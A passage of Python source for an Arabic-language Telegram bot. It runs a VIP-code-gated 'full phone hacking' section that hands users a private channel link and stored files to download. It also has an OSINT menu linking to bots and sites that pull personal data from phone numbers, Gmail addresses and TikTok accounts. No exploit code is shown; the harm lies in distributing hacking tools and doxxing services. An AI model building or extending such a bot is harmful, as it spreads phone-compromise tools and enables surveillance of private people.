        except:
            bot.send_message(chat_id, WELCOME_MSG, reply_markup=markup)

    elif call.data == "admin_panel":
        if is_admin(chat_id):
            send_admin_panel(chat_id, message_id)
        else:
            bot.answer_callback_query(call.id, "❌ لست أدمن", show_alert=True)

    elif call.data == "phone_hack_vip":
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(InlineKeyboardButton("🔑 أدخل كود VIP", callback_data="user_enter_vip_code", style="primary"))
        markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main", style="danger"))
        try:
            bot.edit_message_text("📱 **قسم اختراق الهاتف كامل VIP**\n\n🔒 هذا القسم محمي بكود VIP\n\nاذا معك كود VIP من الأدمن دوس على زر **ادخال الكود**\nواذا مو معك كود دوس على زر **رجوع**", chat_id, message_id, reply_markup=markup, parse_mode="Markdown")
        except:
            bot.send_message(chat_id, "📱 **قسم اختراق الهاتف كامل VIP**\n\n🔒 هذا القسم محمي بكود VIP\n\nاذا معك كود VIP من الأدمن دوس على زر **ادخال الكود**\nواذا مو معك كود دوس على زر **رجوع**", reply_markup=markup, parse_mode="Markdown")

    elif call.data == "user_enter_vip_code":
        waiting_for_user_vip_code[chat_id] = True
        bot.send_message(chat_id, "🔑 أرسل كود VIP:", reply_markup=ForceReply(selective=True))

    elif call.data == "admin_create_vip_code":
        if not is_admin(chat_id):
            bot.answer_callback_query(call.id, "❌ لست أدمن", show_alert=True)
            return
        waiting_for_admin_vip_code[chat_id] = True
        bot.send_message(chat_id, "🔑 أرسل الكود الجديد:")

    elif call.data == "admin_create_clone_code":
        if not is_admin(chat_id):
            bot.answer_callback_query(call.id, "❌ لست أدمن", show_alert=True)
            return
        waiting_for_admin_clone_code[chat_id] = True
        bot.send_message(chat_id, "🤖 أرسل كود انشاء البوت الجديد:")

    elif call.data.startswith("ph_section_"):
        section_id = call.data.replace("ph_section_", "")
        data = load_sections()
        sec_name = section_id
        for sec in data.get("sections", []):
            if sec["id"] == section_id:
                sec_name = sec["name"]
                break
        if section_id == "phone_hack":
            try:
                bot.delete_message(chat_id, message_id)
            except:
                pass
            bot.send_message(chat_id, f"📱 **{sec_name}**\n\n🔗 ادخل القناة وحمّل الملفات:\n\nhttps://t.me/+hD7PO6QAOv00Zjdk\n\nمقدمه من عمك المدمن 🫶💔", parse_mode="Markdown")
        else:
            markup = build_phone_hack_section_menu(section_id)
            try:
                bot.edit_message_text(f"📱 **{sec_name}**\n\nاختر:", chat_id, message_id, reply_markup=markup, parse_mode="Markdown")
            except:
                bot.send_message(chat_id, f"📱 **{sec_name}**\n\nاختر:", reply_markup=markup, parse_mode="Markdown")

    elif call.data.startswith("ph_file_"):
        rest = call.data.replace("ph_file_", "")
        data = load_sections()
        for sec in data.get("sections", []):
            if rest.startswith(sec["id"] + "_"):
                slot_or_index = rest[len(sec["id"])+1:]
                f = get_section_file(sec, slot_or_index)
                if not f:
                    try:
                        idx = int(slot_or_index)
                        files = sec.get("files", [])
                        if 0 <= idx < len(files):
                            f = files[idx]
                    except ValueError:
                        pass
                if f:
                    fp = f.get("file_path", "")
                    if fp and os.path.exists(fp):
                        try:
                            fsize = os.path.getsize(fp)
                            if fsize > 50 * 1024 * 1024:
                                bot.send_message(chat_id, f"⚠️ الملف كبير ({round(fsize/1024/1024)}MB) وأكبر من 50MB.\n📎 رابط التحميل غير متوفر حالياً.")
                            elif fsize == 0:
                                bot.send_message(chat_id, "❌ الملف فارغ.")
                            else:
                                with open(fp, "rb") as fh:
                                    bot.send_document(chat_id, fh, caption=f"📁 **{f.get('label', os.path.basename(fp))}**\n📦 القسم: {sec['name']}", parse_mode="Markdown", timeout=600)
                        except Exception as e:
                            bot.send_message(chat_id, f"❌ خطأ في إرسال الملف: {e}")
                    else:
                        bot.send_message(chat_id, "❌ الملف غير موجود على السيرفر.")
                break

    elif call.data == "ph_empty":
        bot.answer_callback_query(call.id, "⚠️ الملف غير متوفر حالياً", show_alert=True)

    elif call.data == "admin_back":
        send_admin_panel(chat_id, message_id)

    elif call.data == "osint_menu":
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(InlineKeyboardButton("📱 بوتات سحب بيانات الرقم", callback_data="osint_phone_bots", style="primary"))
        markup.add(InlineKeyboardButton("📧 سحب بيانات عبر عنوان Gmail", callback_data="osint_gmail", style="danger"))
        markup.add(InlineKeyboardButton("📞 موقع جلب معلومات الرقم", callback_data="osint_caller", style="success"))
        markup.add(InlineKeyboardButton("🎵 جمع معلومات تيك توك", callback_data="osint_tiktok", style="success"))
        markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main", style="primary"))
        try:
            bot.edit_message_text("🔍 **قسم OSINT**\n\nاختر من القائمة:", chat_id, message_id, reply_markup=markup, parse_mode="Markdown")
        except:
            bot.send_message(chat_id, "🔍 **قسم OSINT**\n\nاختر من القائمة:", reply_markup=markup, parse_mode="Markdown")

    elif call.data == "osint_phone_bots":
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(InlineKeyboardButton("@TelEclipse_bot", url="https://t.me/TelEclipse_bot", style="primary"))
        markup.add(InlineKeyboardButton("@Truecallertobot", url="https://t.me/Truecallertobot", style="danger"))
        markup.add(InlineKeyboardButton("@GetCuntactbot", url="https://t.me/GetCuntactbot", style="success"))
        markup.add(InlineKeyboardButton("@TrueCalleRobot", url="https://t.me/TrueCalleRobot", style="primary"))
        markup.add(InlineKeyboardButton("@tellwhoobot", url="https://t.me/tellwhoobot", style="danger"))
        markup.add(InlineKeyboardButton("@whocallerv5Bot", url="https://t.me/whocallerv5Bot", style="success"))
        markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="osint_menu", style="primary"))
        try:
            bot.edit_message_text("📱 **بوتات سحب بيانات الرقم**\n\nاختر البوت:", chat_id, message_id, reply_markup=markup, parse_mode="Markdown")
        except:
            bot.send_message(chat_id, "📱 **بوتات سحب بيانات الرقم**\n\nاختر البوت:", reply_markup=markup, parse_mode="Markdown")

    elif call.data == "osint_gmail":
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(InlineKeyboardButton("🔗 افتح الموقع", url="https://behindtheemail.com", style="primary"))
        markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="osint_menu", style="danger"))
        try:
            bot.edit_message_text("📧 **سحب بيانات عبر عنوان Gmail**\n\nاضغط على الزر لفتح الموقع:", chat_id, message_id, reply_markup=markup, parse_mode="Markdown")
        except:
            bot.send_message(chat_id, "📧 **سحب بيانات عبر عنوان Gmail**\n\nاضغط على الزر لفتح الموقع:", reply_markup=markup, parse_mode="Markdown")

    elif call.data == "osint_caller":
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(InlineKeyboardButton("🔗 افتح الموقع", url="https://caller-uegx.vercel.app", style="primary"))
        markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="osint_menu", style="danger"))
        try:
            bot.edit_message_text("📞 **موقع جلب معلومات الرقم**\n\nاضغط على الزر لفتح الموقع:", chat_id, message_id, reply_markup=markup, parse_mode="Markdown")
        except:
            bot.send_message(chat_id, "📞 **موقع جلب معلومات الرقم**\n\nاضغط على الزر لفتح الموقع:", reply_markup=markup, parse_mode="Markdown")

    elif call.data == "osint_tiktok":
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(InlineKeyboardButton("🔗 @tiktokinfobot", url="https://t.me/tiktokinfobot", style="primary"))
        markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="osint_menu", style="primary"))
        try:
            bot.edit_message_text("🎵 **جمع معلومات تيك توك**\n\nأرسل اسم المستخدم أو رابط الحساب للبوت:", chat_id, message_id, reply_markup=markup, parse_mode="Markdown")
        except:
            bot.send_message(chat_id, "🎵 **جمع معلومات تيك توك**\n\nأرسل اسم المستخدم أو رابط الحساب للبوت:", reply_markup=markup, parse_mode="Markdown")

# خادم HTTP لإبقاء الخدمة نشطة على Render
class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")
    def log_message(self, *a):
        pass

def run_health_server():
    port = int(os.environ.get("PORT", 8000))
    server = HTTPServer(("0.0.0.0", port), HealthHandler)
    server.serve_forever()

t = threading.Thread(target=run_health_server, daemon=True)
t.start()

print("✅ البوت يعمل...")
import requests as _req
import time as _time

while True:
    try:
        _req.get(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook?drop_pending_updates=true", timeout=10)
        _time.sleep(2)
        bot.infinity_polling(timeout=30, long_polling_timeout=30, allowed_updates=["message", "callback_query"])
        break
    except Exception as e:
        print(f"⚠️ إعادة المحاولة بعد 30 ثانية... {e}")
        _time.sleep(30)
